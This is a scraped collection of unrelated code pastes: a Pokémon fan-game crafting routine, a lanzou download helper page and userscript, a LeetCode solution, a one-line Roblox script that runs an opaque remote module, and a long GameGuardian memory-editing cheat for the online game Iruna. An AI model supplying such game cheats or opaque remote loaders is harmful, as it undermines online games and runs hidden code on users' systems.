      item=table[ball]
      qty=(rand(100)==0)? 5 : 1
    elsif items[0] == :TINYMUSHROOM &&
          items[2] == :TINYMUSHROOM && 
          items[3] == :TINYMUSHROOM
      item=:BIGMUSHROOM
    elsif items[0] == :PEARL &&
          items[2] == :PEARL && 
          items[3] == :PEARL
      item=:BIGPEARL
    elsif items[0] == :BIGPEARL &&
          items[2] == :BIGPEARL && 
          items[3] == :BIGPEARL
      item=:PEARLSTRING
    elsif items[0] == :STARDUST &&
          items[2] == :STARDUST && 
          items[3] == :STARDUST
      item=:STARPIECE
    elsif items[0] == :BIGMUSHROOM &&
          items[2] == :BIGMUSHROOM && 
          items[3] == :BIGMUSHROOM
      item=:BALMMUSHROOM
    elsif items[0] == :NUGGET &&
          items[2] == :NUGGET && 
          items[3] == :NUGGET
      item=:BIGNUGGET
    elsif items[0] == :RARECANDY &&
          items[2] == :RARECANDY && 
          items[3] == :RARECANDY
      item=:ABILITYCAPSULE
    elsif items[0] == :BOTTLECAP &&
          items[2] == :BOTTLECAP && 
          items[3] == :BOTTLECAP
      item=:GOLDBOTTLECAP
    elsif items[0] == :ARMORITEORE &&
          items[2] == :ARMORITEORE && 
          items[3] == :ARMORITEORE
      item=:PPUP
    elsif items[0] == :STARPIECE &&
          items[2] == :STARPIECE && 
          items[3] == :STARPIECE
      item=:COMETSHARD
    else
      cram_data = items.map do |item|
        ret = nil
        GameData::Item.get(item).flags.each do |flag|
          next unless flag[/^CramOMatic_(\w+)_(\d+)$/i]
          ret = [$~[1].to_sym,$~[2].to_i]
        end
        next ret
      end
      type = cram_data[0][0]
      value=0
      cram_data.each do |item|
        value+=item[1]
      end
      list=CRAMOMATIC_TYPERECIPIES[type]
      index=0
      CRAMOMATIC_RATIO.each_index do |i|
        if CRAMOMATIC_RATIO[i]==-1 || value<=CRAMOMATIC_RATIO[i]
          index=i
          break
        end
      end
      item=list[index]
      item=item[rand(item.length)] if item.is_a?(Array)
    end
    item=:REPEL unless item
    Kernel.pbMessage(_INTL(""Combination process complete!\n*BUZZ*\\1""))
    Kernel.pbReceiveItem(item,qty)
  end
end"
NtfSjvDj,lanzouhelp.2,mcdrme,HTML,Saturday 19th of August 2023 10:02:16 PM CDT,"<html>
    <head>
        <meta lang=""zh"">
        <meta charset=""utf-8"">
        <title>获取文件名中...</title>
        <script type=""text/javascript"">
            function GetQueryString(name) {
                var reg = new RegExp(""(^|&)"" + name + ""=([^&]*)(&|$)"", ""i"");
                var r = window.location.search.substr(1).match(reg); //获取url中""?""符后的字符串并正则匹配
                var context = """";
                if (r != null)
                    context = decodeURIComponent(r[2]);
                reg = null;
                r = null;
                return context == null || context == """" || context == ""undefined"" ? """" : context;
            }
                function downloadFile2(url, fileName) {
                var downloadFileA = document.createElement(""a"")
                document.body.append(downloadFileA)
                downloadFileA.href= url
                downloadFileA.download = fileName
                downloadFileA.rel = ""noopener noreferrer""
                downloadFileA.click()
                document.body.removeChild(downloadFileA)
            }
            window.onload = function () {
                var dname = GetQueryString(""name"")
                var durl = GetQueryString(""url"")
                var mainh = document.getElementById(""kw"")
                document.title = dname
                mainh.textContent = dname + "" "" + durl
                downloadFileA(durl, dname)
            }
        </script>
    </head>
    <body inmaintabuse=""1"">
        <h6 id=""mainh"">获取文件名中...</h6>
    <body>
   "
vJ5fM6LK,Untitled,smj007,Python,Saturday 19th of August 2023 09:32:02 PM CDT,"class Solution:
    def solve(self, board: List[List[str]]) -> None:
        """"""
        Do not return anything, modify board in-place instead.
        """"""

        rows = len(board)
        cols = len(board[0])
        visited = set()

        def dfs(r, c):
            if r<0 or c<0 or c == cols or r == rows or board[r][c] == ""X"" or (r, c) in visited:
                return 

            visited.add((r, c))

            dfs(r+1, c)
            dfs(r-1, c)
            dfs(r, c+1)
            dfs(r, c-1)

            return

        for r in range(rows):
            dfs(r, 0)
            dfs(r, cols-1)

        for c in range(cols):
            dfs(0, c)
            dfs(rows-1, c)

        for r in range(rows):
            for c in range(cols):
                if (r, c) not in visited:
                    board[r][c] = ""X"""
tpdn6Hc6,lanzouhelper,mcdrme,JavaScript,Saturday 19th of August 2023 09:20:10 PM CDT,"// ==UserScript==
// @name         lanzouhelper
// @namespace    http://tampermonkey.net/
// @version      1.1(20230816)
// @description  lanzouhelper
// @author       mcdrme
// @match        *://*.lanzouy.com/*
// @exclude      *://*.lanzouy.com/fn?*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=lanzouy.com
// @grant        none
// ==/UserScript==


(function() {
    'use strict';
    console.info(""lanzouhelper启动"")
    var st = true
    var st2 = false

    function elclicker(el) {
        try{
          if(typeof(eval(el.click)) == ""function"") {
              el.target = """"
              el.rel = ""noopener noreferrer""
              var pdlnk = el.href
              console.info(el)
              var pdname = document.querySelector(""body > div.d > div:nth-child(1)"").textContent
              console.info(pdname + "" 文件开始下载... ("" + pdlnk + "")"")
              st2 = false
              el.click()
              //window.close()
          }
        }catch(e) {
            //alert(""not function"");
            console.info(""等待文件加载..."")
        }
    }
    setInterval(() => {
        if(st) {
            var ifrtem2 = document.getElementsByClassName(""ifr2"")[0]
            if(ifrtem2) {
                try{
                    if (ifrtem2.contentWindow.document.readyState === ""complete"") {
                        st = false
                        st2 = true
                        console.info(""ifr2提前加载成功"")
                        console.info(ifrtem2)
                    }
                }catch(e2) {
                    //console.info(""test1..."")
                }
                ifrtem2.onload = function () {
                    st = false
                    st2 = true
                    console.info(""ifr2框架加载完成"")
                    console.info(ifrtem2)
                }
            }
        }else if(st2) {
            ifrtem2 = document.getElementsByClassName(""ifr2"")[0]
            var pdtaga = ifrtem2.contentWindow.document.getElementsByClassName(""load"")[0].childNodes[0]
            elclicker(pdtaga)
        }
        //pdtaga = ifrtem2.contentWindow.document.getElementsByClassName(""load"")[0].childNodes[0]
    }, 50);

})();










"
rdV1W7tZ,Disconnected Notifier Global Gui (Module),KrYn0MoRe,Lua,Saturday 19th of August 2023 09:15:39 PM CDT,require(8513674910)()
MY32jw5r,ZX,ZirconC,Lua,Saturday 19th of August 2023 08:23:54 PM CDT,"gg.setVisible(false)
gg.sleep(500)
gg.alert(""🌊อิรูนา อีดิชั่น 🌬️\nเวอร์ชั่น ออนไลน์ 🌐\nจัดทำโดย ZirconX-Newt 🎃"")
gg.sleep(500)
gg.toast(""กรุณารอสักครู่..."")
gg.sleep(1000)
gg.setVisible(true)

homedm=1
base = {}
top = {}
bot = {}
auth1 = {}
auth2 = {}
rst = {}
xpos = {}
ypos = {}

function menu() -- หน้าหลัก
  local choices = {
    ""🗺️ แมพบอส 🗺️"",
    ""🔍 โหลดแผนที่ 🔍"",
    ""🛡️ แผนที่ป้องกันไวรัส 🛡️"",
    ""🗿 เมนูทักษะ 🗿"",
    ""❌ ออก ❌""
  }

  local choice = gg.choice(choices, nil, ""🌊 อิรูนา อีดิชั่น เวอร์ชัน 2.0 🌬️\n🗃️ เมนูหลัก"")

  if choice == 1 then mb()
  elseif choice == 2 then gg.setVisible(false) lm()
  elseif choice == 3 then gg.setVisible(false) vm() 
  elseif choice == 4 then sh()
  elseif choice == 5 then EXIT()
  end

  homedm = -1
end

function mb() --แมพต่างๆ
  bossmenu1 = gg.choice({
    '1. 🍄 บอสอีเว้นท์',
    '2. 🍎 บอสแมพทั่วไป',
    '3. 🔍 ฟามดาวออโต้',
    '4. ⏪ ย้อนกลับ'
  }, nil, '🎒 สำรวจแมพต่างๆ')

  if bossmenu1 == 1 then eb() end
  if bossmenu1 == 2 then gb() end
  if bossmenu1 == 3 then sb() end
  if bossmenu1 == 4 then menu() end
    homedm= -1
 end
  
 
-------------------------
--แมพบอสอีเว้นท์--
-------------------------
 

function eb() --บอสอีเว้นท์ต่างๆ
meb = gg.multiChoice({
    ""1. ทีม G 🏹"",
    ""2. อาจารย์โอริเทียส 🧙‍♂️"",
    ""3. กาชาโดโรโร 🦁"",
    ""4. Silver Red 🐉"",
    ""5. รูดอล์ฟ 🐺"",
    ""6. เมโดนา 🐲"",
    ""7. เรทโลกอาจารย์โอริเทียส 🌍"",
    ""8. กาซาเสือ 🐯"",
  }, nil, ""🌟 อีเว้นท์บอสต่างๆ ในโลกแห่งอิรูนา 🌟"")
    if meb == nil then else
    if meb [1] == true then e1() end
    if meb [2] == true then e2() end
    if meb [3] == true then e3() end
    if meb [4] == true then e4() end
    if meb [5] == true then e5() end
    if meb [6] == true then e6() end
    if meb [7] == true then e7() end
    if meb [8] == true then e8() end
  end
  homedm= -1
end

function e1()
    	while(true)
		do

		   rst[1].value = 0
		   rst[1].freeze = false
			gg.setValues(rst)
          gg.addListItems(rst)

			bot[1].value = 71900
			bot[1].freeze = false
			auth1[1].value = 14080
          auth1[1].freeze = false
			auth2[1].value = 20480
          auth2[1].freeze = false
			gg.setValues(auth1)
			gg.setValues(auth2)
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)

gg.sleep(4000)

          bot[1].value = 71761
			bot[1].freeze = false
			auth1[1].value = 28928
          auth1[1].freeze = false
			auth2[1].value = 2816
          auth2[1].freeze = false
			gg.setValues(auth1)
			gg.setValues(auth2)
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)
 
gg.sleep(4000)

          bot[1].value = 71791
			bot[1].freeze = false
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)

gg.sleep(4000)

          rst[1].value = 0
          rst[1].freeze = true
			gg.setValues(rst)
          gg.addListItems(rst)
          gg.toast(""เสร็จ 🎲"")

auth2 = gg.getValues(auth2)
	while(auth2[1].value ~= 7168) 
			do
				auth2 = gg.getValues(auth2)
				gg.sleep(100)
			 end
        gg.sleep(100)	

		end
   gg.sleep(100)
end

function e2()
end

function e3()
end

function e4()
end

function e5()
end

function e6()
end

function e7()
end

function e8()
gg.clearResults()
r = {""-104""}
gg.setRanges(gg.REGION_JAVA_HEAP)
gg.searchNumber(""11001"" , gg.TYPE_DWORD)
gg.refineNumber(""11001"", gg.TYPE_DWORD)
q = gg.getResults(1)

for i = 1,#r do
            p = {}
			p[i] = {}
		    p[i].address = q[1].address + r[i]
			p[i].flags = 4 
			p[i].value = 0
			p[i].freeze = true
			gg.addListItems(p)
			gg.setValues(p)
			gg.addListItems(p)
	end	
gg.clearResults()

    	while(true)
		do

		   rst[1].value = 0
		   rst[1].freeze = false
			gg.setValues(rst)
          gg.addListItems(rst)

			bot[1].value = 71900
			bot[1].freeze = false
			auth1[1].value = 14080
          auth1[1].freeze = false
			auth2[1].value = 20480
          auth2[1].freeze = false
			gg.setValues(auth1)
			gg.setValues(auth2)
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)

gg.sleep(4000)

          bot[1].value = 78902
			bot[1].freeze = false
			auth1[1].value = 13000
          auth1[1].freeze = false
			auth2[1].value = 25000
          auth2[1].freeze = false
			gg.setValues(auth1)
			gg.setValues(auth2)
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)
 
gg.sleep(4000)

          rst[1].value = 0
          rst[1].freeze = false
			gg.setValues(rst)
          gg.addListItems(rst)
          gg.toast(""เสร็จ 🎲"")

auth2 = gg.getValues(auth2)
	while(auth2[1].value ~= 23552) 
			do
				auth2 = gg.getValues(auth2)
				gg.sleep(100)
			 end
        gg.sleep(100)	

		end
   gg.sleep(100)
end


-------------------------
--แมพบอสทั่วไป--
-------------------------


function gb() --บอสแมพทั่วไป
meb = gg.multiChoice({
           ""1. เซาโร ทั้งหมด"",
           ""2. อูเบล"",
           ""3. เฟรด"",
           ""4. เอนิน่าII"",
           ""5. ?"",
           ""6. ?"",
           ""7. ?"",
           ""8. ?"",
  }, nil, ""🌟 บอสทั่วไป ในโลกแห่งอิรูนา 🌟"")
    if meb == nil then else
    if meb [1] == true then g1() end
    if meb [2] == true then g2() end
    if meb [3] == true then g3() end
    if meb [4] == true then g4() end
    if meb [5] == true then g5() end
    if meb [6] == true then g6() end
    if meb [7] == true then g7() end
    if meb [8] == true then g8() end
  end
  homedm= -1
end

function g1() --หัวข้อเซาโร
MG = gg.multiChoice({
""1.1 เซาโร 170"" ,
""1.2 เซาโร 350"" ,
""1.3 เซาโร 400"",
},nil,""เซาโร ทั้งหมด"")
  if MG == nil then
  else 
    if MG [1] == true then RE55() end
    if MG [2] == true then D1() A1() A2() end
    if MG [3] == true then DN() end
    end
  homedm= -1
end

function g2()
end

function g3()
end

function g4()
end

function g5()
end

function g6()
end

function g7()
end

function g8()
end


-------------------------
--แมพบอสฟามดาวต่างๆ--
-------------------------


function sb() --บอสแมพทั่วไป
meb = gg.multiChoice({
           ""1. ออโต้สกิล"",
           ""2. ลดสัดส่วน"",
           ""3. ?"",
           ""4. ?"",
  }, nil, ""🌟 แมพฟาร์มดาว ในโลกแห่งอิรูนา 🌟"")
    if meb == nil then else
    if meb [1] == true then s1() end
    if meb [2] == true then s2() end
    if meb [3] == true then s3() end
    if meb [4] == true then s4() end
  end
  homedm= -1
end

function s1() --หัวข้อเซาโร
MG = gg.multiChoice({
""1.1 คู่"" ,
""1.2 ชุด"" ,
""1.3 เสริม"",
},nil,""ออโต้สกิล"")
  if MG == nil then
  else 
    if MG [1] == true then sauto1() end
    if MG [2] == true then sauto2() end
    if MG [3] == true then sauto3() end
    end
  homedm= -1
end

function g2()
end

function g3()
end

function g4()
end


function MN1() --แม่แบบ
WC = gg.multiChoice({
           ""ทีม G 🕷️"",
           ""เซาโร 400 🧓🏻"",
           ""อาจารย์โอริเทียส 🧑🏻‍🏫"",
           ""เกตคีปเปอร์ 🪰"",
           ""หน้าต่อไป 🎃"",
           ""❎ ก ลั บ ❎""
}, nil, ""แผนที่บอส หน้าที่1 📜\nเวอร์ชั่น ออนไลน์ 🌐"")
  if WC == nil then
  else
    if WC [1] == true then
      WC1()
    end
    if WC [2] == true then
     WC2()
    end
    if WC [3] == true then
     WC3()
    end
    if WC [4] == true then
     WC4()
    end
    if WC [5] == true then
      Nextto()
    end
    if WC [6] == true then
      menu()
    end
  end
  homedm= -1
end

function WC1() 
    	while(true)
		do

		   rst[1].value = 0
		   rst[1].freeze = false
			gg.setValues(rst)
          gg.addListItems(rst)

			bot[1].value = 71900
			bot[1].freeze = false
			auth1[1].value = 14080
          auth1[1].freeze = false
			auth2[1].value = 20480
          auth2[1].freeze = false
			gg.setValues(auth1)
			gg.setValues(auth2)
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)

gg.sleep(4000)

          bot[1].value = 71761
			bot[1].freeze = false
			auth1[1].value = 28928
          auth1[1].freeze = false
			auth2[1].value = 2816
          auth2[1].freeze = false
			gg.setValues(auth1)
			gg.setValues(auth2)
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)
 
gg.sleep(4000)

          bot[1].value = 71791
			bot[1].freeze = false
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)

gg.sleep(4000)

          rst[1].value = 0
          rst[1].freeze = true
			gg.setValues(rst)
          gg.addListItems(rst)
          gg.toast(""เสร็จ 🎲"")

auth2 = gg.getValues(auth2)
	while(auth2[1].value ~= 7168) 
			do
				auth2 = gg.getValues(auth2)
				gg.sleep(100)
			 end
        gg.sleep(100)	

		end
   gg.sleep(100)
end
 
function WC2()
while(true)
		do
		   rst[1].value = 0
		   rst[1].freeze = false
			gg.setValues(rst)
          gg.addListItems(rst)

			bot[1].value = 71900
			bot[1].freeze = false
			auth1[1].value = 14080
          auth1[1].freeze = false
			auth2[1].value = 20480
          auth2[1].freeze = false
			gg.setValues(auth1)
			gg.setValues(auth2)
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)

gg.sleep(3000)

          bot[1].value = 5466
			bot[1].freeze = false
			auth1[1].value = 14080
          auth1[1].freeze = false
			auth2[1].value = 20480
          auth2[1].freeze = false
			gg.setValues(auth1)
			gg.setValues(auth2)
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)

gg.sleep(3000)

          bot[1].value = 5496          
           auth1[1].value = 14080
          auth1[1].freeze = false
			auth2[1].value = 20480
          auth2[1].freeze = false
			gg.setValues(auth1)
			gg.setValues(auth2)        
			bot[1].freeze = false
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)

gg.sleep(4000)

          rst[1].value = 0
          rst[1].freeze = true
			gg.setValues(rst)
          gg.addListItems(rst)
          gg.toast(""เสร็จ 🎲"")

auth2 = gg.getValues(auth2)
	while(auth2[1].value ~= 9984) 
			do
				auth2 = gg.getValues(auth2)
				gg.sleep(100)
			 end
        gg.sleep(100)	
		end
   gg.sleep(100)
end

function WC3()
    	while(true)
		do
		   rst[1].value = 0
		   rst[1].freeze = false
			gg.setValues(rst)
          gg.addListItems(rst)

			bot[1].value = 71900
			bot[1].freeze = false
			auth1[1].value = 14080
          auth1[1].freeze = false
			auth2[1].value = 20480
          auth2[1].freeze = false
			gg.setValues(auth1)
			gg.setValues(auth2)
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)

gg.sleep(3000)

          bot[1].value = 103298
			bot[1].freeze = false
			auth1[1].value = 4080
          auth1[1].freeze = false
			auth2[1].value = 20480
          auth2[1].freeze = false
			gg.setValues(auth1)
			gg.setValues(auth2)
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)

gg.sleep(4000)

          rst[1].value = 0
          rst[1].freeze = true
			gg.setValues(rst)
          gg.addListItems(rst)
          gg.toast(""เสร็จ 🎲"")

auth2 = gg.getValues(auth2)
	while(auth2[1].value ~= 30464) 
			do
				auth2 = gg.getValues(auth2)
				gg.sleep(100)
			 end
        gg.sleep(100)	

		end
   gg.sleep(100)
end

function WC4() 
    	while(true)
		do
		   rst[1].value = 0
		   rst[1].freeze = false
			gg.setValues(rst)
          gg.addListItems(rst)

			bot[1].value = 71900
			bot[1].freeze = false
			auth1[1].value = 14080
          auth1[1].freeze = false
			auth2[1].value = 20480
          auth2[1].freeze = false
			gg.setValues(auth1)
			gg.setValues(auth2)
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)

gg.sleep(3000)

          bot[1].value = 50660
			bot[1].freeze = false
			auth1[1].value = 9984
          auth1[1].freeze = false
			auth2[1].value = 29952
          auth2[1].freeze = false
			gg.setValues(auth1)
			gg.setValues(auth2)
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)

gg.sleep(3000)

          bot[1].value = 50690
			bot[1].freeze = false
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)
        
gg.sleep(4000)

        gg.clearResults()
        gg.setRanges(gg.REGION_JAVA_HEAP)
        gg.searchNumber(""39.0F;29.0F::13"",gg.TYPE_FLOAT)
        gg.refineNumber(""29.0"",gg.TYPE_FLOAT)
        gg.getResults(100)
        gg.editAll(""116"",gg.TYPE_FLOAT)
        gg.clearResults()

gg.sleep(2000)

          rst[1].value = 0
          rst[1].freeze = true
			gg.setValues(rst)
          gg.addListItems(rst)
          gg.toast(""เสร็จ 🎲"")

auth2 = gg.getValues(auth2)
	while(auth2[1].value ~= 20224) 
			do
				auth2 = gg.getValues(auth2)
				gg.sleep(100)
			 end
        gg.sleep(100)	
		end
   gg.sleep(100)
end

function WC5() 
    	while(true)
		do
		   rst[1].value = 0
		   rst[1].freeze = false
			gg.setValues(rst)
          gg.addListItems(rst)

			bot[1].value = 71900
			bot[1].freeze = false
			auth1[1].value = 14080
          auth1[1].freeze = false
			auth2[1].value = 20480
          auth2[1].freeze = false
			gg.setValues(auth1)
			gg.setValues(auth2)
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)

gg.sleep(3000)

          bot[1].value = 47460
			bot[1].freeze = false
			auth1[1].value = 7936
          auth1[1].freeze = false
			auth2[1].value = 23552
          auth2[1].freeze = false
			gg.setValues(auth1)
			gg.setValues(auth2)
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)

gg.sleep(3000)

          bot[1].value = 47490
			bot[1].freeze = false
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)    

gg.sleep(3000)

          rst[1].value = 0
          rst[1].freeze = true
			gg.setValues(rst)
          gg.addListItems(rst)
          gg.toast(""เสร็จ 🎲"")

auth2 = gg.getValues(auth2)
	while(auth2[1].value ~= 25856) 
			do
				auth2 = gg.getValues(auth2)
				gg.sleep(100)
			 end
        gg.sleep(100)	
		end
   gg.sleep(100)
end

function MN2() --📂 ชุด
ML = gg.multiChoice({
           ""อาจิระ จาร์มะ 🦅"",
           ""อินิลิบา "",
           ""Silver Red "",
           ""เซาโร 350 🧓🏻"",
           ""บอสใหม่ "",
           ""อูเวล "",
           ""หน้าต่อไป"",
           ""❎ ก ลั บ ❎""
}, nil, ""แผนที่บอส หน้าที่2 📜\nเวอร์ชั่น ออนไลน์ 🌐"")
  if ML == nil then
  else
    if ML [1] == true then
      ML1()
    end
    if ML [2] == true then
     ML2()
    end 
    if ML [3] == true then
     ML3()
    end
    if ML [4] == true then
     ML4()
    end
    if ML [5] == true then
     ML5()
    end
    if ML [6] == true then
     ML6()
    end
    if ML [7] == true then
     MN3()
    end
    if ML [8] == true then
      MN1()
    end
  end
  homedm= -1
end

function ML1() 
    	while(true)
		do
		   rst[1].value = 0
		   rst[1].freeze = false
			gg.setValues(rst)
          gg.addListItems(rst)

			bot[1].value = 71900
			bot[1].freeze = false
			auth1[1].value = 14080
          auth1[1].freeze = false
			auth2[1].value = 20480
          auth2[1].freeze = false
			gg.setValues(auth1)
			gg.setValues(auth2)
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)

gg.sleep(3000)

          bot[1].value = 52260
			bot[1].freeze = false
			auth1[1].value = 20224
          auth1[1].freeze = false
			auth2[1].value = 24832
          auth2[1].freeze = false
			gg.setValues(auth1)
			gg.setValues(auth2)
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)

gg.sleep(3000)

          bot[1].value = 52290
			bot[1].freeze = false
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)    

gg.sleep(5000)

          rst[1].value = 0
          rst[1].freeze = true
			gg.setValues(rst)
          gg.addListItems(rst)
          gg.toast(""เสร็จ 🎲"")

auth2 = gg.getValues(auth2)
	while(auth2[1].value ~= 25856) 
			do
				auth2 = gg.getValues(auth2)
				gg.sleep(100)
			 end
        gg.sleep(100)	
		end
   gg.sleep(100)
end
 
function ML2()
    	while(true)
		do
		   rst[1].value = 0
		   rst[1].freeze = false
			gg.setValues(rst)
          gg.addListItems(rst)

			bot[1].value = 71900
			bot[1].freeze = false
			auth1[1].value = 14080
          auth1[1].freeze = false
			auth2[1].value = 20480
          auth2[1].freeze = false
			gg.setValues(auth1)
			gg.setValues(auth2)
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)

gg.sleep(3500)

          bot[1].value = 44360
			bot[1].freeze = false
			auth1[1].value = 8960
          auth1[1].freeze = false
			auth2[1].value = 19712
          auth2[1].freeze = false
			gg.setValues(auth1)
			gg.setValues(auth2)
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)
 
gg.sleep(4000)

          bot[1].value = 44390
			bot[1].freeze = false
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)

gg.sleep(4000)

          rst[1].value = 0
          rst[1].freeze = true
			gg.setValues(rst)
          gg.addListItems(rst)
          gg.toast(""เสร็จ 🎲"")

auth2 = gg.getValues(auth2)
	while(auth2[1].value ~= 9472) 
			do
				auth2 = gg.getValues(auth2)
				gg.sleep(100)
			 end
        gg.sleep(100)	
		end
   gg.sleep(100)
end
 
function ML3()	
           while(true)
		do
		   rst[1].value = 0
		   rst[1].freeze = false
			gg.setValues(rst)
          gg.addListItems(rst)

			bot[1].value = 71900
			bot[1].freeze = false
			auth1[1].value = 14080
          auth1[1].freeze = false
			auth2[1].value = 20480
          auth2[1].freeze = false
			gg.setValues(auth1)
			gg.setValues(auth2)
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)

gg.sleep(3000)

          bot[1].value = 78293
			bot[1].freeze = false
			auth1[1].value = 25344
          auth1[1].freeze = false
			auth2[1].value = 46080
          auth2[1].freeze = false
			gg.setValues(auth1)
			gg.setValues(auth2)
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)

gg.sleep(4000)

          rst[1].value = 0
          rst[1].freeze = true
			gg.setValues(rst)
          gg.addListItems(rst)
          gg.toast(""เสร็จ 🎲"")

auth2 = gg.getValues(auth2)
	while(auth2[1].value ~= 35840) 
			do
				auth2 = gg.getValues(auth2)
				gg.sleep(100)
			 end
        gg.sleep(100)	
		end
   gg.sleep(100)
end

function ML4() ------------------------------- 350
    	while(true)
		do

		   rst[1].value = 0
		   rst[1].freeze = false
			gg.setValues(rst)
          gg.addListItems(rst)

			bot[1].value = 71900
			bot[1].freeze = false
			auth1[1].value = 14080
          auth1[1].freeze = false
			auth2[1].value = 20480
          auth2[1].freeze = false
			gg.setValues(auth1)
			gg.setValues(auth2)
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)

gg.sleep(3000)

          bot[1].value = 5465
			bot[1].freeze = false
			auth1[1].value = 14080
          auth1[1].freeze = false
			auth2[1].value = 20480
          auth2[1].freeze = false
			gg.setValues(auth1)
			gg.setValues(auth2)
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)

gg.sleep(3500)

          bot[1].value = 5495          
           auth1[1].value = 14080
          auth1[1].freeze = false
			auth2[1].value = 20480
          auth2[1].freeze = false
			gg.setValues(auth1)
			gg.setValues(auth2)           
			bot[1].freeze = false
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)

gg.sleep(4700)

          rst[1].value = 0
          rst[1].freeze = true
			gg.setValues(rst)
          gg.addListItems(rst)
          gg.toast(""เสร็จ 🎲"")

auth2 = gg.getValues(auth2)
	while(auth2[1].value ~= 9984) 
			do
				auth2 = gg.getValues(auth2)
				gg.sleep(100)
			 end
        gg.sleep(100)	
		end
   gg.sleep(100)
end

function ML5()
    	while(true)
		do
		   rst[1].value = 0
		   rst[1].freeze = false
			gg.setValues(rst)
          gg.addListItems(rst)

			bot[1].value = 71900
			bot[1].freeze = false
			auth1[1].value = 14080
          auth1[1].freeze = false
			auth2[1].value = 20480
          auth2[1].freeze = false
			gg.setValues(auth1)
			gg.setValues(auth2)
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)

gg.sleep(3000)
 
          bot[1].value = 57560
            bot[1].freeze = false
            auth1[1].value = 24100
          auth1[1].freeze = false
            auth2[1].value = 18000
          auth2[1].freeze = false
            gg.setValues(auth1)
            gg.setValues(auth2)
            gg.setValues(bot)
            rst[1].value = 16842752 
            gg.setValues(rst)
 
gg.sleep(3000)
 
          bot[1].value = 57590
            bot[1].freeze = false
            auth1[1].value = 24100
          auth1[1].freeze = false
            auth2[1].value = 18000
          auth2[1].freeze = false
            gg.setValues(auth1)
            gg.setValues(auth2)
            gg.setValues(bot)
            rst[1].value = 16842752 
            gg.setValues(rst)

gg.sleep(4000)
 
          rst[1].value = 0
          rst[1].freeze = true
            gg.setValues(rst)
          gg.addListItems(rst)
          gg.toast(""เสร็จ 🎲"")

auth2 = gg.getValues(auth2)
	while(auth2[1].value ~= 21760) 
			do
				auth2 = gg.getValues(auth2)
				gg.sleep(100)
			 end
        gg.sleep(100)	
		end
   gg.sleep(100)
end

function ML6()
    	while(true)
		do
		   rst[1].value = 0
		   rst[1].freeze = false
			gg.setValues(rst)
          gg.addListItems(rst)

			bot[1].value = 71900
			bot[1].freeze = false
			auth1[1].value = 14080
          auth1[1].freeze = false
			auth2[1].value = 20480
          auth2[1].freeze = false
			gg.setValues(auth1)
			gg.setValues(auth2)
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)

gg.sleep(3000)
 
          bot[1].value = 42260
            bot[1].freeze = false
            auth1[1].value = 10752
          auth1[1].freeze = false
            auth2[1].value = 22272
          auth2[1].freeze = false
            gg.setValues(auth1)
            gg.setValues(auth2)
            gg.setValues(bot) 
            rst[1].value = 16842752 
            gg.setValues(rst)
 
gg.sleep(3000)

          bot[1].value = 42360
           auth1[1].value = 10240
          auth1[1].freeze = false
			auth2[1].value = 5120
          auth2[1].freeze = false
			gg.setValues(auth1)
			gg.setValues(auth2)        
			bot[1].freeze = false
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)
 
gg.sleep(3000)

          bot[1].value = 42390
           auth1[1].value = 10240
          auth1[1].freeze = false
			auth2[1].value = 17700
          auth2[1].freeze = false
			gg.setValues(auth1)
			gg.setValues(auth2)        
			bot[1].freeze = false
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)

gg.sleep(3500)

          gg.searchNumber(""40.0F;1.10000002384F;40.0F::22"",gg.TYPE_FLOAT)
          gg.refineNumber(""40.0"",gg.TYPE_FLOAT)
          local q = gg.getResults(20,nil,nil,nil,nil,nil,nil,nil,nil,gg.TYPE_FLOAT)
          gg.editAll(""40"",gg.TYPE_FLOAT)
          gg.clearResults()

gg.sleep(4000)
 
          rst[1].value = 0
          rst[1].freeze = true
            gg.setValues(rst)
          gg.addListItems(rst)
          gg.toast(""เสร็จ 🎲"")

auth2 = gg.getValues(auth2)
	while(auth2[1].value ~= 7680) 
			do
				auth2 = gg.getValues(auth2)
				gg.sleep(100)
			 end
        gg.sleep(100)	
		end
   gg.sleep(100)
end

-------------------------------------


function MN33() --📂 menu Game
MG = gg.multiChoice({
           ""Freedom-Life™ \nBy GonFesCh.📜"",
           ""BACK🔙""
}, nil, ""🌈IRUNA Gacha 🎉\nเวอร์ชั่น 1.0.1♥️\nCredit 💳"")
  if MG == nil then
  else
